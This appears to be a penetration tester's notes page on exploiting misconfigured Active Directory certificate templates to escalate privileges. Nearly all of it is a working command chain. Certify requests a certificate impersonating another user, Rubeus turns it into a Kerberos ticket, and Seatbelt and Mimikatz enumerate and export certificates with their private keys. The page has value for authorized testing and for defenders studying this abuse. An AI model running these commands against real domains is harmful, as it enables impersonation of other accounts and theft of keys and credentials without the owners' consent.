# Exploiting Certificate Misconfigurations
Four attributes are required for a certificate misconfiguration to lead to privilege escalation:
- Client Authentication
- CT_FLAG_ENROLEE_SUPPLIES_SUBJECT
- CTPRIVATEKEY_FLAG_EXPORTABLE_KEY
- Certificate Permissions

We can view all certificate templates using the following windows utility.

```powershell
certutil -Template -v > templates.txt
```

Using [[Certify]]:
```powershell
Certify.exe cas # Output all certificate authorities
Certify.exe find /vulnerable # Identify vulnerable certificates in the environment
Certify.exe request /ca:<ca> /template:<template> /altname:<username> # Output a certificate as the requested user with an example openssl command to convert for usage with Rubeus
cat cert.pfx | base64 -w 0 # Convert for Rubeus
Rubeus.exe asktgt /user:<username> /certificate:<base64 cert> /password:<cert pass> /nowrap # Get a TGT as the requested user
```
If a achine account is requested, certify has to be told manually with the `/machine` flag.

Alternative, enumerate existing certificates with [[Seatbelt]]
```powershell
Seatbelt.exe Certificates # Enumerate certificates (make sure it can be used for client authentication)
```

Export with [[Mimikatz]]
```powershell
mimikatz.exe crypto::certificates /export /enctype:aes256 # This will export the pfx files with password "mimikatz"
```
